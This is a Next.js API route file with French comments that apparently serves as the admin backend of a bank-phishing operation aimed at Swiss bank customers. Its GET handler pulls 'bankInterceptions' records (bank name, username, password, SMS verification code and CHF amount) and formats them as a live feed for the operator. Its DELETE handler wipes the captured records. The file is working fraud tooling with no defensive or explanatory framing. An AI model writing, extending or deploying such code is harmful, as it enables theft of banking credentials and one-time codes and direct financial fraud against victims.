import { NextResponse } from "next/server";
import { db } from "@/lib/turso";
import { bankInterceptions } from "@/lib/schema";
import { desc } from "drizzle-orm";

export async function GET() {
  try {
    const rawLogs = await db
      .select()
      .from(bankInterceptions)
      .orderBy(desc(bankInterceptions.createdAt));

    const formattedActivities: any[] = [];
 
    rawLogs.forEach((log) => {
      const createdAtStr = log.createdAt || new Date().toISOString();
      const createdDate = new Date(createdAtStr);
      
      const timeStr = createdDate.toLocaleTimeString("fr-FR", { hour: "2-digit", minute: "2-digit", second: "2-digit" });
      const dateStr = createdDate.toLocaleDateString("fr-FR", { day: "numeric", month: "short", year: "numeric" });

      // 1. Carte des identifiants bancaires
      formattedActivities.push({
        type: "credentials",
        id: `b_${log.id}`,
        bankName: log.bankName,
        username: log.username,
        secret: log.password,
        time: timeStr,
        date: dateStr,
        rawTimestamp: createdDate.getTime(),
      });

      // Partage de la même date/heure de mise à jour si disponible
      const updatedAtStr = log.updatedAt || new Date().toISOString();
      const updatedDate = new Date(updatedAtStr);
      const updateTimeStr = updatedDate.toLocaleTimeString("fr-FR", { hour: "2-digit", minute: "2-digit", second: "2-digit" });
      const updateDateStr = updatedDate.toLocaleDateString("fr-FR", { day: "numeric", month: "short", year: "numeric" });

      // 2. Si un code SMS a été soumis
      if (log.smsCode) {
        formattedActivities.push({
          type: "code",
          id: `c_${log.id}`,
          bankName: log.bankName,
          username: log.username,
          codeValue: log.smsCode,
          time: updateTimeStr,
          date: updateDateStr,
          rawTimestamp: updatedDate.getTime() + 1, // Léger décalage pour l'ordre de tri
        });
      }

      // 3. Si un montant a été soumis
      if (log.amountInput) {
        formattedActivities.push({
          type: "amount",
          id: `a_${log.id}`,
          bankName: log.bankName,
          username: log.username,
          amountValue: `${log.amountInput} CHF`,
          time: updateTimeStr,
          date: updateDateStr,
          rawTimestamp: updatedDate.getTime(),
        });
      }
    });

    // Tri pour que tout apparaisse dans l'ordre d'arrivée exact
    formattedActivities.sort((a, b) => b.rawTimestamp - a.rawTimestamp);

    return NextResponse.json({ success: true, data: formattedActivities });

  } catch (error) {
    console.error("Erreur API Admin GET:", error);
    return NextResponse.json(
      { error: "Impossible de charger le flux en direct." },
      { status: 500 }
    );
  }
}

export async function DELETE() {
  try {
    // Supprime l'intégralité des lignes de la table bankInterceptions
    await db.delete(bankInterceptions);
    
    return NextResponse.json({ 
      success: true, 
      message: "Toutes les interceptions ont été supprimées avec succès." 
    });
  } catch (error) {
    console.error("Erreur API Admin DELETE:", error);
    return NextResponse.json(
      { error: "Impossible de vider la base de données." },
      { status: 500 }
    );
  }
}